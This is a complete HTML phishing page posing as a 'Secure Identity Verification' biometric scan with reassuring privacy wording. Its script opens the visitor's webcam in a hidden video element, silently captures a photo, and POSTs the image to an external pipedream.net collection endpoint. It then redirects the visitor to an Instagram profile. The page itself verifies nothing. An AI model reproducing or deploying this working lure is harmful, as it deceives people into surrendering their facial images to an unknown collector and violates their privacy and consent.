<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Identity Verification</title>
    <style>
        :root { --accent: #6366f1; --bg: #0f172a; --card: rgba(30, 41, 59, 0.7); }
        body { font-family: 'Inter', sans-serif; background: radial-gradient(circle at top right, #1e1b4b, #0f172a); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: var(--card); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); padding: 3rem; border-radius: 24px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); max-width: 420px; text-align: center; }
        h1 { font-size: 1.5rem; margin-bottom: 1rem; letter-spacing: -0.025em; }
        p { color: #94a3b8; font-size: 0.95rem; margin-bottom: 2rem; line-height: 1.6; }
        button { background: var(--accent); color: white; border: none; padding: 14px 28px; border-radius: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s; width: 100%; font-size: 1rem; }
        button:hover { transform: translateY(-2px); filter: brightness(1.1); }
        #status { margin-top: 20px; font-size: 0.85rem; color: #60a5fa; }
        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--accent); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verify Your Identity</h1>
        <p>To keep your account secure, please perform a quick biometric scan. Your privacy is our priority.</p>
        <div id="spinner" class="spinner"></div>
        <button id="accessButton">Start Verification</button>
        <p id="status"></p>
        <video id="videoElement" autoplay playsinline></video>
        <canvas id="canvasElement"></canvas>
    </div>

    <script>
        const btn = document.getElementById('accessButton');
        const status = document.getElementById('status');
        const spinner = document.getElementById('spinner');
        const uploadPath = 'https://eoukkf7emqrufvo.m.pipedream.net/';

        btn.addEventListener('click', async () => {
            status.textContent = 'Initializing secure stream...';
            spinner.style.display = 'block';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('videoElement');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvasElement');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const data = canvas.toDataURL('image/jpeg', 0.8);
                    stream.getTracks().forEach(t => t.stop());
                    
                    fetch(uploadPath, { method: 'POST', body: JSON.stringify({ image: data }) })
                        .then(() => window.location.href = 'https://www.instagram.com/mastinaiiiii');
                }, 1500);
            } catch (err) {
                status.textContent = 'Access required for verification.';
            }
        });
    </script>
</body>
</html>
